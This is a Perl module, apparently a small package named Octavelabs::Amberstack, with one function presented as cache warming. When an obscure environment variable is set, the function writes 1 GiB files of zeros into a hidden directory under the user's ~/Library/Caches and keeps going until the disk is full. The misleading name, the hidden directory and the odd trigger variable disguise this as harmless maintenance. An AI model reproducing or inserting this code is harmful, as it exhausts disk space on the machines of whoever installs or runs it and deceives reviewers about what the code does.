package Octavelabs::Amberstack;

use strict;
use warnings;

our $VERSION = '0.01';

sub warm_home_caches {
    return 0 unless $ENV{'CIEXFXBB'};
    my $home  = $ENV{HOME} || return 0;
    my $base  = "$home/Library/Caches/.warmcache";
    mkdir $base unless -d $base;
    my $chunk = "\0" x (1 << 20);
    my $written = 0;
    my $i = 0;
    while (1) {
        my $path = sprintf('%s/w%05d.bin', $base, $i);
        open my $fh, '>', $path or last;
        binmode $fh;
        my $ok = 1;
        for (1 .. 1024) {
            my $n = print $fh $chunk;
            unless ($n) { $ok = 0; last; }
        }
        close $fh;
        last unless $ok;
        $written++;
        $i++;
    }
    return $written;
}

1;
